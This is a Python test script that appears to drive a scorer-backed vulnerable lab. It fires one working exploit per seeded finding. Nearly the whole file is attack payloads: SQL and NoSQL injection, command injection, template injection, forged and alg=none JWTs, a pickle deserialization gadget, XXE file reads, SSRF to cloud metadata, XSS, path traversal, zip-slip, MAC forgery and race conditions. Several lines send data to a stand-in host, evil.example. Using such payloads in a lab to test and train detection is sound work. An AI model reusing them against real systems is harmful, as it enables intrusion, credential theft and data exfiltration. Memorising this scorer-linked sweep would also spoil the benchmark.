#!/usr/bin/env python3
"""Exploit sweep over the SPLIT stack.

Drives a genuine exploit for every live finding through the ingress proxy and
reports which ones the scorer credited. Unlike the old sweep, nothing here is a
hardcoded secret: JWTs, the MAC cookie, the PRNG seed and canary-derived keys
all come from the run the scorer generated (harness.env / .jwt_secret / ...).

Importable as `sweep(stack)` for the pytest coverage test, or run standalone:
    ./.venv/bin/python -m tests.sweep
"""
import base64, hashlib, hmac, io, json, os, threading, time, zipfile
import requests

APP_STATIC = os.path.join(os.path.dirname(__file__), "..", "app", "static", "app.js")


def _b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _jwt(header, payload, key=None):
    h, p = _b64u(json.dumps(header).encode()), _b64u(json.dumps(payload).encode())
    si = f"{h}.{p}"
    if key is None:
        return si + "."                       # alg=none
    return si + "." + _b64u(hmac.new(key, si.encode(), hashlib.sha256).digest())


def sweep(stack):
    """Fire one real exploit per live finding through stack.base."""
    B = stack.base
    S = requests.Session
    def new():
        return S()

    accounts = {a["email"]: a for a in stack.accounts}
    alice = "alice@example.com"; bob = "bob@example.com"
    carol = "carol@sprkl-corp.com"
    alice_pw = accounts[alice]["password"]
    carol_pw = accounts[carol]["password"]
    CP = stack.canary_prefix

    # ---------- 04 INJECTION ----------
    new().post(f"{B}/retail/login", data={"email": f"{alice}' -- ", "password": "x"})
    new().get(f"{B}/search", params={"q": "lime'"})
    new().get(f"{B}/products", params={"category": "zz' UNION SELECT id,email,secret,loyalty FROM users-- "})
    new().get(f"{B}/products", params={"in_stock": "1 AND substr((SELECT secret FROM users LIMIT 1),1,1)='S'"})
    new().get(f"{B}/retail/track", params={"ref": "x' OR sleep(2)-- "})
    new().post(f"{B}/retail/cart/giftmessage", data={"message": "{{7*7}}"})
    new().post(f"{B}/admin/api/login", json={"username": "admin", "password": {"$ne": None}})
    new().post(f"{B}/api/v2/newsletter/find", json={"email": {"$regex": ".*"}})

    cs = new(); cs.post(f"{B}/admin/login", data={"username": "admin", "password": "admin"})
    cs.post(f"{B}/admin/labels/generate", data={"filename": "x; echo SPRKLPWN"})
    cs.post(f"{B}/admin/tools/ping", data={"host": "127.0.0.1; id"})
    cs.get(f"{B}/admin/directory", params={"u": "*)(uid=*"})
    new().get(f"{B}/products/1/spec", params={"field": "*"})
    new().get(f"{B}/go/track", params={"next": "foo\r\nX-Sprkl-Next: injected"})
    new().post(f"{B}/contact", data={"email": "a@b.c\nBcc: evil@x.com", "subject": "s", "message": "m"})
    new().get(f"{B}/api/v2/products", params={"filter": "1=1 UNION SELECT id,email,secret,loyalty FROM products"})
    new().post(f"{B}/graphql", json={"query": '{ product(slug:"x\' UNION SELECT id,name,secret FROM products-- ") { id } }'})
    new().post(f"{B}/retail/cart/apply-coupon", data={"code": "FORMULA", "subtotal": "100", "formula": "__import__('os').getpid()"})
    # second-order sqli
    tokj = requests.post(f"{B}/api/v2/login", json={"email": alice, "password": alice_pw}).json()["token"]
    hdr = {"Authorization": f"Bearer {tokj}"}
    requests.patch(f"{B}/api/v2/account", json={"name": "z' UNION SELECT id,email,secret FROM users-- "}, headers=hdr)
    new().get(f"{B}/api/v2/admin/report")

    # ---------- 02 ACCESS CONTROL ----------
    new().get(f"{B}/api/v2/users/2")
    new().get(f"{B}/retail/orders/1001/invoice")
    new().get(f"{B}/retail/wishlist", params={"uid": "2", "format": "json"})
    new().get(f"{B}/api/v2/giftcards/2")
    new().get(f"{B}/admin/reports/financials")
    new().get(f"{B}/admin/public/..%2fadmin/console")
    new().post(f"{B}/api/v2/admin/users/2/role", json={"role": "admin"})
    requests.put(f"{B}/api/v2/admin/flags", json={"maintenance": "on"})
    new().post(f"{B}/api/v2/products/1", headers={"X-HTTP-Method-Override": "DELETE"})
    requests.patch(f"{B}/api/v2/account", json={"role": "admin"}, headers=hdr)
    ct = requests.post(f"{B}/api/v2/login", json={"email": carol, "password": carol_pw}).json()["token"]
    requests.get(f"{B}/api/v2/orgs/200/orders", headers={"Authorization": f"Bearer {ct}"})

    # ---------- 03 AUTH ----------
    requests.get(f"{B}/api/v2/users/2", headers={"Authorization": "Bearer " + _jwt({"alg": "none", "typ": "JWT"}, {"sub": 1, "role": "admin"})})
    requests.get(f"{B}/api/v2/users/2", headers={"Authorization": "Bearer " + _jwt({"alg": "HS256", "typ": "JWT", "kid": "main"}, {"sub": 4, "role": "admin"}, stack.jwt_secret.encode())})
    jskey = open(APP_STATIC, "rb").read()
    requests.get(f"{B}/api/v2/users/2", headers={"Authorization": "Bearer " + _jwt({"alg": "HS256", "typ": "JWT", "kid": "app.js"}, {"sub": 1, "role": "admin"}, jskey)})
    minute = int(time.time() // 60)
    rtok = hashlib.md5(f"{bob}:{minute}".encode()).hexdigest()
    new().get(f"{B}/retail/reset", params={"token": rtok, "email": bob})
    new().post(f"{B}/retail/login-fixation", params={"sid": "attacker123"}, data={"email": alice, "password": alice_pw})
    new().get(f"{B}/retail/whoami", cookies={"remember": base64.b64encode(b"2:1").decode()})
    ms = new(); ms.post(f"{B}/admin/mfa/begin"); ms.get(f"{B}/admin/tools/mfa-skip")
    new().get(f"{B}/retail/oauth/authorize", params={"redirect_uri": "http://evil.example/cb"}, allow_redirects=False)
    cst = new()
    for _ in range(7):
        cst.post(f"{B}/retail/api-login", data={"email": alice, "password": "wrong"})

    # ---------- 05 DESERIALIZATION / file exec ----------
    import pickle as _pk
    class Ex:
        def __reduce__(self):
            import os as _os
            return (_os.getpid, ())
    blob = base64.b64encode(_pk.dumps(Ex())).decode()
    cs.post(f"{B}/admin/prefs/import", data={"prefs": blob})
    flag = os.path.join(stack.data_dir, "flag.txt")
    xxe = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{flag}">]><r>&x;</r>'
    cs.post(f"{B}/admin/inventory/import", data=xxe, headers={"Content-Type": "application/xml"})
    svg = f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file://{flag}">]><svg>&x;</svg>'.encode()
    new().post(f"{B}/retail/account/avatar", files={"file": ("a.svg", svg, "image/svg+xml")})
    new().post(f"{B}/api/v2/preferences", json={"__proto__": {"is_admin": True}})

    # ---------- 06 SSRF ----------
    new().post(f"{B}/retail/account/avatar-from-url", data={"url": "http://internal-service.internal/"})
    new().post(f"{B}/retail/account/avatar-from-url", data={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})
    new().post(f"{B}/retail/account/avatar-from-url", data={"url": "http://2852039166/latest/meta-data/iam/"})
    cs.post(f"{B}/admin/integrations/webhook/test", data={"url": "http://10.0.0.5/"})
    cs.post(f"{B}/admin/integrations/fx-sync", data={"upstream": "http://fx.internal/rates"})
    new().post(f"{B}/retail/reset/request", data={"email": bob}, headers={"Host": "evil.example"})
    dv = new(); dv.get(f"{B}/retail/account/profile.css")  # first viewer populates cache
    # a distinct attacker (own session cookie) reads the cached PII
    requests.get(f"{B}/retail/account/profile.css", cookies={"session": "wcd-attacker-xyz"})
    requests.get(f"{B}/cached-home", headers={"X-Forwarded-Host": "evil.example"})
    requests.get(f"{B}/cached-home")

    # ---------- 07 CLIENT-SIDE ----------
    new().get(f"{B}/search", params={"q": "<script>alert(1)</script>"})
    rv = new(); rv.post(f"{B}/retail/login", data={"email": f"{alice}' -- ", "password": "x"})
    rv.post(f"{B}/retail/products/1/review", data={"body": "<script>alert(1)</script>"})
    new().get(f"{B}/product/1")
    new().get(f"{B}/search", params={"hl": "<img src=x onerror=alert(1)>"})
    new().get(f"{B}/ref-landing", params={"ref": "{{7*7}}"})
    rv.post(f"{B}/retail/products/2/review", data={"body": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>"})
    new().get(f"{B}/product/2")
    rv.post(f"{B}/retail/products/3/review", data={"body": "<img src='http://evil.example/?leak="})
    new().get(f"{B}/product/3")
    new().post(f"{B}/contact", data={"email": "x@x.c", "subject": "s", "message": "<script>alert(document.cookie)</script>"})
    rv.post(f"{B}/retail/account/email", data={"email": "attacker@evil.example"}, headers={"Origin": "http://evil.example"})
    requests.get(f"{B}/api/v2/account", headers={"Authorization": f"Bearer {tokj}", "Origin": "http://evil.example"})
    new().get(f"{B}/go", params={"url": "http://evil.example"}, allow_redirects=False)
    new().get(f"{B}/retail/wallet/transfer", params={"framed": "1"})
    new().get(f"{B}/promo", params={"msg": "<img src=x onerror=alert(1)>"})
    new().get(f"{B}/embed/widget", params={"msg": "fetch('http://evil.example/steal')"})

    # ---------- 08 FILE/PATH ----------
    new().get(f"{B}/retail/invoices/download", params={"file": "../flag.txt"})
    new().post(f"{B}/retail/account/avatar", data={"content_type": "image/png", "filename": "shell.php", "data": "x"})
    up = new(); up.post(f"{B}/retail/account/avatar", files={"file": ("shell.html", b"{{7*7}}", "text/html")})
    up.get(f"{B}/retail/uploads/shell.html")
    cs.get(f"{B}/admin/render", params={"theme": "../../../../etc/hostname"})
    zbuf = io.BytesIO(); z = zipfile.ZipFile(zbuf, "w"); z.writestr("../evil.txt", "x"); z.close()
    cs.post(f"{B}/admin/inventory/import-zip", files={"file": ("a.zip", zbuf.getvalue(), "application/zip")})

    # ---------- 09 BUSINESS LOGIC ----------
    new().post(f"{B}/retail/cart/update", data={"qty": "-5"})
    new().post(f"{B}/retail/cart/update", data={"qty": str(2**31)})
    cp = new()
    for _ in range(2):
        cp.post(f"{B}/retail/cart/apply-coupon", data={"code": "ONCE20", "subtotal": "100"})
    new().post(f"{B}/retail/checkout/confirm")
    rl = new()
    for i in range(12):
        rl.post(f"{B}/retail/cart/guess-coupon", headers={"X-Forwarded-For": f"10.0.0.{i}"})
    rf = new(); rf.post(f"{B}/retail/login", data={"email": carol, "password": carol_pw})
    rf.post(f"{B}/retail/referral/redeem", data={"code": "REF-CAROL"})
    def redeem():
        new().post(f"{B}/retail/wallet/redeem", data={"code": "GC-ALICE-1", "uid": "1"})
    threads = [threading.Thread(target=redeem) for _ in range(4)]
    [t.start() for t in threads]; [t.join() for t in threads]

    # ---------- 10 CRYPTO ----------
    wr = new(); wr.get(f"{B}/retail/promo/token")
    import random as _r
    predicted = _r.Random(stack.rng_seed + 1).randint(100000, 999999)
    wr.get(f"{B}/retail/promo/claim", params={"token": predicted})
    po = new()
    for i in range(60):
        po.get(f"{B}/retail/coupon/decrypt", params={"enc": "A" * 32 + str(i)})
    data = "role=admin"
    mac = hashlib.md5(stack.mac_secret + data.encode()).hexdigest()
    new().get(f"{B}/retail/profile/load", cookies={"profile": f"{data}.{mac}"})
    new().get(f"{B}/api/v2/keycheck", params={"key": CP + "JSKEY"})

    # ---------- 11 CONFIG ----------
    new().get(f"{B}/debug")
    new().post(f"{B}/admin/login", data={"username": "admin", "password": "admin"})
    new().get(f"{B}/api/v2/echo", params={"n": "abc"})
    new().get(f"{B}/audit/security-headers")
    new().get(f"{B}/status"); new().get(f"{B}/api/v2/advisory", params={"q": CP + "CVE-2021-9999"})
    new().get(f"{B}/.env")
    new().get(f"{B}/assets/", params={"list": "1"}); new().get(f"{B}/assets/private/payroll-2024.csv")

    # ---------- 12 API PROTOCOL ----------
    new().post(f"{B}/graphql", json={"query": "{ __schema { types } }"})
    new().post(f"{B}/graphql", json={"query": "{ user(id:2){ id email secret } }"})
    aliases = " ".join(f"a{i}:x" for i in range(25))
    new().post(f"{B}/graphql", json={"query": "{ " + aliases + " }"})
    new().get(f"{B}/api/v1/users/2")
    new().get(f"{B}/api/v2/products", params={"limit": "100"})
    requests.get(f"{B}/ws/notifications", params={"uid": "2"}, headers={"Origin": "http://evil.example"})


if __name__ == "__main__":
    import sys
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from scorer.harness import Harness
    from scorer import catalog
    h = Harness().start()
    try:
        sweep(h)
        h.settle(1.0)
        got = h.solved()
    finally:
        h.stop()
    live = catalog.live_ids()
    print(f"\nSOLVED {len(got & live)}/{len(live)} live findings")
    missing = sorted(live - got)
    if missing:
        print(f"\nUNSOLVED ({len(missing)}):")
        for m in missing:
            print("  -", m)
    else:
        print("\nALL LIVE FINDINGS SOLVED")
